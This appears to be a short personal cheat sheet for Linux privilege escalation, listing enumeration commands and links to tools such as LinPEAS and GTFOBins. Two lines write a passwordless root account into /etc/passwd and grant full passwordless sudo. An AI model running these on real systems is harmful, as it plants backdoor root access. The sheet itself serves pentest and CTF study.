# Privilege Escalation

## Linux
**Commands:**
```
1. getcap -r / 2>/dev/null

2. find / -perm -u=s -type f 2>/dev/null
   // Harden: chmod u-s /usr/bin/find

3. find -writable 2>/dev/null | cut -d "/" -f 2 | sort -u

4. find / -writable 2>/dev/null | grep home | cut -d "/" -f 2,3 | sort -u

5. sudo -V // to check sudo version, which might be vulnerable.

6. echo "vickie::0:0:System Administrator:/root/root:/bin/bash" >> /etc/passwd

7. echo "vickie ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

8. groups // Don't forget about groups.

9. docker (https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)

10. find / -type f -executable -group users 2>/dev/null
    //To find a file that can be executed by a specific group.
```
**Use:**
https://gtfobins.github.io/

<hr>

### Basic Linux enumeration
https://cyberlab.pacific.edu/resources/linux-enumeration-cheat-sheet

**Get Privilege Escalation vectors:**
- LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
- LinEnum: https://github.com/rebootuser/LinEnum
- LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
- Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
- Linux Priv Checker: https://github.com/linted/linuxprivchecker

## Windows
_nothing yet_